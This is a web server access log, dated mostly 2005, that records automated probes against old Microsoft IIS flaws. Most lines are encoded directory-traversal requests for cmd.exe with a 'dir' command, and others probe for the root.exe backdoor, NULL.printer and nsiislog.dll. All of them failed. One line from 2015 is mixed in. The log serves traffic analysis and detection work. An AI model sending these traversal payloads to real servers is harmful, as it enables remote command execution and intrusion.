218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
64.60.251.53 - - [11/Jun/2005:23:37:52 -0400] "get /scripts/..%e0%80%af../..%e0%80%af../..%e0%80%af../winnt/system32/cmd.exe?/c+dir" 501 350 "-" "-"
63.203.254.140 - - [10/Jun/2005:01:23:50 -0400] "get /scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir" 501 336 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
68.236.170.254 - - [02/Jul/2005:17:28:54 -0400] "GET /NULL.printer" 404 301 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
62.221.237.83 - - [14/Jun/2005:11:33:44 -0400] "get /scripts/..%5c../winnt/system32/cmd.exe?/c+dir" 501 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:45 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:09 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
62.221.237.83 - - [10/Jun/2005:04:15:02 -0400] "get /scripts/..%35c../winnt/system32/cmd.exe?/c+dir" 501 333 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
213.61.135.6 - - [10/Jun/2005:01:24:12 -0400] "get /scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir" 501 336 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:18 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:58 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
61.88.122.10 - - [10/Jul/2005:03:47:54 -0400] "GET /NULL.printer" 404 301 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
202.118.167.71 - - [11/Jun/2005:12:00:08 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:10 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:54 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:11 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
81.171.132.146 - - [01/Oct/2005:06:21:56 -0400] "GET /NULL.printer" 404 301 "-" "-"
202.118.167.71 - - [15/Jun/2005:00:35:38 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
85.69.89.232 - - [22/Jun/2005:15:24:39 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
85.69.89.232 - - [22/Jun/2005:15:24:39 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
209.195.166.17 - - [22/Jun/2005:03:50:22 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:13 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:11 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
66.249.192.129 - - [04/Jul/2005:04:21:57 -0400] "GET /NULL.printer" 404 301 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:45 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
66.249.192.129 - - [04/Jul/2005:04:21:57 -0400] "GET /NULL.printer" 404 301 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
63.99.211.195 - - [22/Jun/2005:15:27:42 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
66.249.193.151 - - [13/Jul/2005:20:51:44 -0400] "GET /NULL.printer" 404 301 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
202.118.167.71 - - [18/Jun/2005:01:48:02 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
202.118.167.71 - - [15/Jun/2005:00:35:38 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:10 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
65.96.54.37 - - [06/Feb/2005:01:59:43 -0500] "GET /NULL.printer" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
65.96.54.37 - - [24/Feb/2005:17:01:49 -0500] "GET /NULL.printer" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:21 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
63.203.254.140 - - [13/Jun/2005:01:16:37 -0400] "get /scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir" 501 336 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.61.135.6 - - [10/Jun/2005:01:24:12 -0400] "get /scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir" 501 336 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
81.6.250.202 - - [17/Feb/2005:06:57:36 -0500] "GET /NULL.printer" 404 1061 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:53 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
61.88.122.10 - - [10/Jul/2005:03:47:54 -0400] "GET /NULL.printer" 404 301 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:58 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
64.147.69.59 - - [11/Jun/2005:11:45:09 -0400] "get /scripts/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir" 501 347 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:54 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
61.88.122.10 - - [30/Jan/2005:08:46:25 -0500] "GET /NULL.printer" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:10 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:11 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
64.237.165.66 - - [11/Mar/2005:23:18:12 -0500] "GET /NULL.printer" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
12.216.230.125 - - [11/Jun/2005:11:56:27 -0400] "get /scripts/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir" 501 347 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:11 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:57 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:31 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
66.18.136.228 - - [02/Mar/2005:03:48:19 -0500] "GET /NULL.printer" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
209.201.25.170 - - [27/Feb/2005:08:39:22 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.205.73.192 - - [10/Jun/2005:11:40:14 -0400] "get /scripts/..%e0%80%af../..%e0%80%af../..%e0%80%af../winnt/system32/cmd.exe?/c+dir" 501 350 "-" "-"
202.118.167.71 - - [16/Jun/2005:00:18:19 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:50 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:09 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
206.49.194.36 - - [18/Feb/2005:01:44:37 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
66.112.85.249 - - [11/Feb/2005:01:41:25 -0500] "GET /NULL.printer" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:09 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:16 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:45 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
216.84.100.130 - - [03/Mar/2005:20:22:53 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:33 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
216.204.128.187 - - [22/Jun/2005:03:55:28 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
207.181.126.3 - - [11/Jun/2005:11:46:25 -0400] "get /scripts/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir" 501 347 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:10 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
207.181.126.3 - - [11/Jun/2005:11:46:25 -0400] "get /scripts/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir" 501 347 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
216.184.121.184 - - [05/Feb/2005:11:10:28 -0500] "GET /NULL.printer" 404 1061 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:10 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:11 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:30:59 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:11 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:48 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:31 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:58 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
213.194.182.13 - - [09/Jul/2005:13:07:18 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
202.118.167.71 - - [14/Jun/2005:00:24:20 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
64.147.69.59 - - [11/Jun/2005:11:45:09 -0400] "get /scripts/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir" 501 347 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:30 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:11 -0400] "GET /scripts/root.exe?/c+dir" 404 305 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
213.194.182.13 - - [09/Jul/2005:20:31:01 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
63.84.238.40 - - [01/Mar/2005:15:49:10 -0500] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 1061 "-" "-"
81.171.132.146 - - [28/Sep/2005:03:30:42 -0400] "GET /NULL.printer" 404 301 "-" "-"
213.194.182.13 - - [09/Jul/2005:10:48:31 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:07 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
46.118.127.106 - - [20/May/2015:12:05:17 +0000] "GET /scripts/grok-py-test/configlib.py HTTP/1.1" 200 235 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html
213.194.182.13 - - [09/Jul/2005:13:07:15 -0400] "GET /scripts/..%255c%255c../winnt/system32/cmd.exe?/c+dir" 404 330 "-" "-"
64.60.251.53 - - [11/Jun/2005:23:37:52 -0400] "get /scripts/..%e0%80%af../..%e0%80%af../..%e0%80%af../winnt/system32/cmd.exe?/c+dir" 501 350 "-" "-"
209.195.166.17 - - [22/Jun/2005:03:50:22 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
218.106.69.52 - - [19/Jul/2005:09:50:08 -0400] "GET /msadc/..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir" 404 332 "-" "-"
63.99.211.195 - - [22/Jun/2005:15:27:42 -0400] "get /scripts/root.exe?/c+dir" 501 312 "-" "-"
221.124.66.208 - - [09/Oct/2005:00:51:55 -0400] "GET /scripts/nsiislog.dll" 404 309 "-" "-"
